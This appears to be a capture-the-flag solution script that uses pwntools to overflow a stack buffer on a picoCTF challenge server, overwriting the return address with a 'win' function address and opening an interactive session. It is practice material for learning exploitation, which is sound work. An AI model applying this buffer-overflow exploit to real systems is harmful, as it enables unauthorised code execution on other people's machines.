from pwn import *

r = remote("saturn.picoctf.net",  60955)

payload = b'A' * 44
WIN_ADDR = 0x80491f6

payload += p32(WIN_ADDR)

print(r.recvuntil(b":"))
r.sendline(payload)

r.interactive()
